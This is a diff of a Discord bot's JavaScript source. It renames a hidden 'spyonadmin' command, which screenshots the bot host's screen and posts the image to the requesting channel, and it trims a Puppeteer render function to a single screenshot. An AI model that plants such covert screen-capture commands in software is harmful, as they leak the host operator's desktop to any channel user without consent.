@@ -82,7 +82,7 @@ client.on("message", async (message) => {
     answer += "```";
 
     message.channel.send(answer);
-  } else if (command == `${guildPrefix}` + "adasdspyonadmin") {
+  } else if (command == `${guildPrefix}` + "spyonadmin") {
     screenshot({ filename: "./screenshots/shot.png" }).then(() => {
       const attachment = new MessageAttachment("./screenshots/shot.png");
       message.channel.send(`${message.author},`, attachment);
@@ -187,14 +187,14 @@ async function render() {
   // page.setContent(htmlString);
   await page.keyboard.press("Control");
   const imageBuffer = new Array();
-  for (let i = 0; i < 4; i++) {
-    imageBuffer.push(await page.screenshot({}));
-  }
+
+  imageBuffer.push(await page.screenshot({}));
+
   await browser.close();
 
   // write file to disk as buffer
   for (let i in imageBuffer) {
-    await writeFile(`rendered${i}.png`, imageBuffer[i]);
+    await writeFile(`rendered.png`, imageBuffer[i]);
   }
 
   // convert to base64 string if you want to:
